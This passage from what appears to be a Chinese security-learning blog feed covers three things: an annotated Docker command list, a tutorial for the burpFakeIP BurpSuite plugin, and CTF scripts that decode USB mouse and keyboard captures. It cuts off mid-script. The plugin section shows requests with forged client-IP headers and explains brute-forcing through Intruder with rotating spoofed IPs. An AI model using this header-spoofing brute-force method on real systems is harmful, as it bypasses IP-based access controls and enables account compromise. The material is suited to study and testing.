-l, --log-level=info            Set the logging level  #设置日志级别</span><br><span class="line">  --tls=false                     Use TLS; implied by--tlsverify  #</span><br><span class="line">  --tlscacert=~/.docker/ca.pem    Trust certs signed only by this CA  #信任证书签名CA</span><br><span class="line">  --tlscert=~/.docker/cert.pem    Path to TLS certificate file  #TLS证书文件路径</span><br><span class="line">  --tlskey=~/.docker/key.pem      Path to TLS key file  #TLS密钥文件路径</span><br><span class="line">  --tlsverify=false               Use TLS and verify the remote  #使用TLS验证远程</span><br><span class="line">  -v, --version=false             Print version information and quit  #打印版本信息并退出</span><br><span class="line"> </span><br><span class="line">Commands:</span><br><span class="line">    attach    Attach to a running container  #当前shell下attach连接指定运行镜像</span><br><span class="line">    build     Build an image from a Dockerfile  #通过Dockerfile定制镜像</span><br><span class="line">    commit    Create a new image from a container&#x27;s changes  #提交当前容器为新的镜像</span><br><span class="line">    cp      Copy files/folders from a container to a HOSTDIR or to STDOUT  #从容器中拷贝指定文件或者目录到宿主机中</span><br><span class="line">    create    Create a new container  #创建一个新的容器，同run 但不启动容器</span><br><span class="line">    diff      Inspect changes on a container&#x27;s filesystem  #查看docker容器变化</span><br><span class="line">    events    Get real time events from the server#从docker服务获取容器实时事件</span><br><span class="line">    exec      Run a command in a running container#在已存在的容器上运行命令</span><br><span class="line">    export    Export a container&#x27;s filesystem as a tar archive  #导出容器的内容流作为一个tar归档文件(对应import)</span><br><span class="line">    history   Show the history of an image  #展示一个镜像形成历史</span><br><span class="line">    images    List images  #列出系统当前镜像</span><br><span class="line">    import    Import the contents from a tarball to create a filesystem image  #从tar包中的内容创建一个新的文件系统映像(对应export)</span><br><span class="line">    info      Display system-wide information  #显示系统相关信息</span><br><span class="line">    inspect   Return low-level information on a container or image  #查看容器详细信息</span><br><span class="line">    kill      Kill a running container  #kill指定docker容器</span><br><span class="line">    load      Load an image from a tar archive or STDIN  #从一个tar包中加载一个镜像(对应save)</span><br><span class="line">    login     Register or log in to a Docker registry#注册或者登陆一个docker源服务器</span><br><span class="line">    logout    Log out from a Docker registry  #从当前Docker registry退出</span><br><span class="line">    logs     Fetch the logs of a container  #输出当前容器日志信息</span><br><span class="line">    pause     Pause all processes within a container#暂停容器</span><br><span class="line">    port      List port mappings or a specific mapping for the CONTAINER  #查看映射端口对应的容器内部源端口</span><br><span class="line">    ps      List containers  #列出容器列表</span><br><span class="line">    pull      Pull an image or a repository from a registry  #从docker镜像源服务器拉取指定镜像或者库镜像</span><br><span class="line">    push      Push an image or a repository to a registry  #推送指定镜像或者库镜像至docker源服务器</span><br><span class="line">    rename    Rename a container  #重命名容器</span><br><span class="line">    restart   Restart a running container  #重启运行的容器</span><br><span class="line">    rm      Remove one or more containers  #移除一个或者多个容器</span><br><span class="line">    rmi      Remove one or more images  #移除一个或多个镜像(无容器使用该镜像才可以删除，否则需要删除相关容器才可以继续或者-f强制删除)</span><br><span class="line">    run     Run a command in a new container  #创建一个新的容器并运行一个命令</span><br><span class="line">    save      Save an image(s) to a tar archive#保存一个镜像为一个tar包(对应load)</span><br><span class="line">    search    Search the Docker Hub for images  #在docker</span><br><span class="line">hub中搜索镜像</span><br><span class="line">    start     Start one or more stopped containers#启动容器</span><br><span class="line">    stats     Display a live stream of container(s) resource usage statistics  #统计容器使用资源</span><br><span class="line">    stop      Stop a running container  #停止容器</span><br><span class="line">    tag       Tag an image into a repository  #给源中镜像打标签</span><br><span class="line">    top       Display the running processes of a container #查看容器中运行的进程信息</span><br><span class="line">    unpause   Unpause all processes within a container  #取消暂停容器</span><br><span class="line">    version   Show the Docker version information#查看容器版本号</span><br><span class="line">    wait      Block until a container stops, then print its exit code  #截取容器停止时的退出状态值</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpfakeIP</title>
      <link href="/2024/05/13/burpfakeIP/"/>
      <url>/2024/05/13/burpfakeIP/</url>
      
        <content type="html"><![CDATA[<h1 id="burpfakeIP"><a href="#burpfakeIP" class="headerlink" title="burpfakeIP"></a>burpfakeIP</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>burpfakeIP是BurpSuite的一个插件</p><p>可以用于伪造ip</p><p><a href="https://github.com/TheKingOfDuck/burpFakeIP">下载地址</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载并解压到本地</p><p>打开BP 安装</p><p><img src="https://bu.dusays.com/2024/05/13/6641a8390c410.png" alt="image-20240503155652009"></p><p>添加</p><p><img src="https://bu.dusays.com/2024/05/13/6641a838cf356.png" alt="image-20240503155723758"></p><p>下一个</p><p><img src="https://bu.dusays.com/2024/05/13/6641a838e22a6.png" alt="image-20240503155745843"></p><p>安装成功</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="伪造指定ip"><a href="#伪造指定ip" class="headerlink" title="伪造指定ip"></a>伪造指定ip</h3><blockquote><p>右击抓到的数据包，选择fakeip，inputIP，输入想要用的ip地址，点击确定，自动添加</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a8399f81c.png" alt="image-20240503155958255"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a838de7db.png" alt="image-20240503160008018"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a839e78c5.png" alt="image-20240503160021997"></p><h3 id="伪造本地ip"><a href="#伪造本地ip" class="headerlink" title="伪造本地ip"></a>伪造本地ip</h3><blockquote><p>右击数据包选择127.0.0.1（如上图），自动生成如下数据包</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line"> </span><br><span class="line">Host: 192.168.1.135:8002</span><br><span class="line"> </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line"> </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"> </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"> </span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"> </span><br><span class="line">Cookie: ASPSESSIONIDAACSRSQS=CJLFMKFBLOABHEPKPBEKLPOA; ASPSESSIONIDAACSRTRT=HOAFJLFBABBHLECCHJEGMIMO</span><br><span class="line"> </span><br><span class="line">DNT: 1</span><br><span class="line"> </span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"> </span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-Forwarded:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Forwarded-For:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Forwarded:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-Forwarded-Host:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-remote-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-remote-addr:127.0.0.1</span><br><span class="line"> </span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-Real-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Ali-CDN-Real-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Cdn-Src-Ip:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Cdn-Real-Ip:127.0.0.1</span><br><span class="line"> </span><br><span class="line">CF-Connecting-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-Cluster-Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">WL-Proxy-Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Proxy-Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Fastly-Client-Ip:127.0.0.1</span><br><span class="line"> </span><br><span class="line">True-Client-Ip:127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="伪造随机ip"><a href="#伪造随机ip" class="headerlink" title="伪造随机ip"></a>伪造随机ip</h3><blockquote><p>右击数据包选择randomIP(如上图)，生成如下数据包</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line"> </span><br><span class="line">Host: 192.168.1.135:8002</span><br><span class="line"> </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line"> </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"> </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"> </span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"> </span><br><span class="line">Cookie: ASPSESSIONIDAACSRSQS=CJLFMKFBLOABHEPKPBEKLPOA; ASPSESSIONIDAACSRTRT=HOAFJLFBABBHLECCHJEGMIMO</span><br><span class="line"> </span><br><span class="line">DNT: 1</span><br><span class="line"> </span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"> </span><br><span class="line">X-Forwarded-For:37.120.247.234</span><br><span class="line"> </span><br><span class="line">X-Forwarded:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Forwarded-For:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Forwarded:37.120.247.234</span><br><span class="line"> </span><br><span class="line">X-Forwarded-Host:37.120.247.234</span><br><span class="line"> </span><br><span class="line">X-remote-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">X-remote-addr:37.120.247.234</span><br><span class="line"> </span><br><span class="line">True-Client-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">X-Client-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Client-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">X-Real-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Ali-CDN-Real-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Cdn-Src-Ip:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Cdn-Real-Ip:37.120.247.234</span><br><span class="line"> </span><br><span class="line">CF-Connecting-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">X-Cluster-Client-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">WL-Proxy-Client-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Proxy-Client-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Fastly-Client-Ip:37.120.247.234</span><br><span class="line"> </span><br><span class="line">True-Client-Ip:37.120.247.234</span><br></pre></td></tr></table></figure><h3 id="随机ip爆破"><a href="#随机ip爆破" class="headerlink" title="随机ip爆破"></a>随机ip爆破</h3><p>这是这个插件的核心功能</p><blockquote><p>将数据包发送到Intruder模块,在Positions中切换Attack type为Pitchfork模式,选择好有效的伪造字段,以及需要爆破的字段</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a8399eac4.png" alt="image-20240503160320597"></p><blockquote><p>将Payload来源设置为Extensin-generated,并设置负载伪fakeIpPayloads,然后设置第二个变量。</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a839d8843.png" alt="image-20240503160349569"></p><p>点击Start attack开始爆破.</p><p><img src="https://bu.dusays.com/2024/05/13/6641a839c72c2.png" alt="image-20240503160409258"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>USB流量分析</title>
      <link href="/2024/05/13/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2024/05/13/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h1><p>USB流量指的是USB设备接口的流量，攻击者能够通过监听usb接口流量获取键盘敲击键、鼠标移动与点击、存储设备的铭文传输通信、USB无线网卡网络传输内容等等。在CTF中，USB流量分析主要以键盘和鼠标流量为主。</p><h2 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h2><p>基础知识<br>USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为四个字节</p><p>第一个字节,代表按键</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当取0×00时,代表没有按键</span><br><span class="line">当取0×01时,代表按左键</span><br><span class="line">当取0×02时,代表当前按键为右键</span><br></pre></td></tr></table></figure><p>第二个字节,可看作为signed byte类型，其最高位为符号位，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当值为正时，代表鼠标右移像素位；</span><br><span class="line">值为负时，代表鼠标左移像素位。</span><br></pre></td></tr></table></figure><p>第三个字节,代表垂直上下移动的偏移。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当值为正时，代表鼠标上移像素位；</span><br><span class="line">值为负时，代表鼠标下移像素位。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200801015359139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="img"></p><p>如图，数据信息为0x00002000，表示鼠标垂直向上移动20</p><p>flag隐藏在usb流量中，通过USB协议数据中的鼠标移动轨迹转换成flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Opcode</span>(<span class="title class_ inherited__">Enum</span>):</span><br><span class="line">    LEFT_BUTTON_HOLDING = <span class="number">0b00000001</span></span><br><span class="line">    RIGHT_BUTTON_HOLDING = <span class="number">0b00000010</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MouseEmulator</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.x = <span class="number">0</span></span><br><span class="line">        self.y = <span class="number">0</span></span><br><span class="line">        self.left_button_holding = <span class="literal">False</span></span><br><span class="line">        self.left_button_holding = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">move</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        self.x += x</span><br><span class="line">        self.y -= y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_left_button</span>(<span class="params">self, state</span>):</span><br><span class="line">        self.left_button_holding = state</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_right_button</span>(<span class="params">self, state</span>):</span><br><span class="line">        self.right_button_holding = state</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">snapshot</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (self.x, self.y, self.left_button_holding, self.right_button_holding)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MouseTracer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.snapshots = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, snapshot</span>):</span><br><span class="line">        self.snapshots.append(snapshot)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_pcap</span>(<span class="params">filepath</span>):</span><br><span class="line">    cap = pyshark.FileCapture(filepath)</span><br><span class="line">    <span class="keyword">for</span> packet <span class="keyword">in</span> cap:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(packet, <span class="string">&#x27;usb&#x27;</span>) <span class="keyword">and</span> <span class="built_in">hasattr</span>(packet, <span class="string">&#x27;DATA&#x27;</span>) <span class="keyword">and</span> <span class="built_in">hasattr</span>(packet.DATA, <span class="string">&#x27;usb_capdata&#x27;</span>):</span><br><span class="line">            <span class="keyword">yield</span> packet.DATA.usb_capdata</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_packet</span>(<span class="params">payload</span>):</span><br><span class="line">    items = [struct.unpack(<span class="string">&#x27;b&#x27;</span>, <span class="built_in">bytes</span>.fromhex(i))[<span class="number">0</span>]</span><br><span class="line">             <span class="keyword">for</span> i <span class="keyword">in</span> payload.split(<span class="string">&quot;:&quot;</span>)]</span><br><span class="line"></span><br><span class="line">    state, movement_x, movement_y = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(items) == <span class="number">4</span>:</span><br><span class="line">        state, movement_x, movement_y, _ = items</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(items) == <span class="number">8</span>:</span><br><span class="line">        state, _, movement_x, _, movement_y, _, _, _ = items</span><br><span class="line"></span><br><span class="line">    left_button_holding = state &amp; Opcode.LEFT_BUTTON_HOLDING.value != <span class="number">0</span></span><br><span class="line">    right_button_holding = state &amp; Opcode.RIGHT_BUTTON_HOLDING.value != <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> movement_x, movement_y, left_button_holding, right_button_holding</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">snapshot_mouse</span>(<span class="params">filepath</span>):</span><br><span class="line">    mouse_emulator = MouseEmulator()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> load_pcap(filepath):</span><br><span class="line">        mx, my, lbh, rbh = parse_packet(i)</span><br><span class="line">        mouse_emulator.move(mx, my)</span><br><span class="line">        mouse_emulator.set_left_button(lbh)</span><br><span class="line">        mouse_emulator.set_right_button(rbh)</span><br><span class="line">        <span class="keyword">yield</span> mouse_emulator.snapshot()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_args</span>():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-i&quot;</span>, <span class="string">&quot;--input-file&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Path to the input pcap file.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    args = parse_args()</span><br><span class="line">    mt = MouseTracer()</span><br><span class="line"></span><br><span class="line">    xs = []</span><br><span class="line">    ys = []</span><br><span class="line">    colors = []</span><br><span class="line">    alphas = []</span><br><span class="line">    <span class="keyword">for</span> snapshot <span class="keyword">in</span> snapshot_mouse(args.input_file):</span><br><span class="line">        x, y, lbh, rbh = snapshot</span><br><span class="line">        color = <span class="string">&quot;red&quot;</span> <span class="keyword">if</span> lbh <span class="keyword">else</span> <span class="string">&quot;grey&quot;</span></span><br><span class="line">        color = <span class="string">&quot;blue&quot;</span> <span class="keyword">if</span> rbh <span class="keyword">else</span> color</span><br><span class="line">        alpha = <span class="number">1</span> <span class="keyword">if</span> lbh <span class="keyword">or</span> rbh <span class="keyword">else</span> <span class="number">0.1</span></span><br><span class="line">        mt.add(snapshot)</span><br><span class="line">        xs.append(snapshot[<span class="number">0</span>])</span><br><span class="line">        ys.append(snapshot[<span class="number">1</span>])</span><br><span class="line">        colors.append(color)</span><br><span class="line">        alphas.append(alpha)</span><br><span class="line"></span><br><span class="line">    plt.scatter(xs, ys, c=colors, alpha=alphas)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><p>USB协议数据部分在Leftover Capture Data域中，数据长度为八个字节。</p><p>击键信息集中在第3个字节，每次击键都会产生一个数据包。</p><p><a href="https://max.book118.com/html/2017/0407/99227972.shtm">参考文档</a>：USB keyboard映射表<br><img src="https://img-blog.csdnimg.cn/20210405115902138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">flag信息一般隐藏在flag隐藏在usb流量中，通过USB协议数据中的键盘键码转换成键位。</p><p>1.使用kali linux中的tshark 命令把cap data提取出来：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class="line">tshark -r usb.pcap -T fields -e usb.capdata | sed &#x27;/^\s*$/d&#x27; &gt; usbdata.txt #提取并去除空行</span><br></pre></td></tr></table></figure><p>2.根据《USB键盘协议中键码》中的HID Usage ID将数据还原成键位，可写一个Python脚本进行快速转换。</p><p>提取出来的数据可能会带冒号，也可能不带，但是一般的脚本都会按照有冒号的数据来识别。有冒号时提取数据的<code>[6:8]</code>，无冒号时数据在<code>[4:6]</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>: <span class="comment"># 键盘流量len=16，鼠标流量len=8</span></span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a7aac6b18.png" alt="image-20240204195045748"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a7aac6c07.png" alt="image-20240204195026090"></p><p>再用脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line">    <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line">     <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line">      <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line">       <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line">        <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line">         <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line">         <span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line">         <span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line">         <span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line">         <span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span 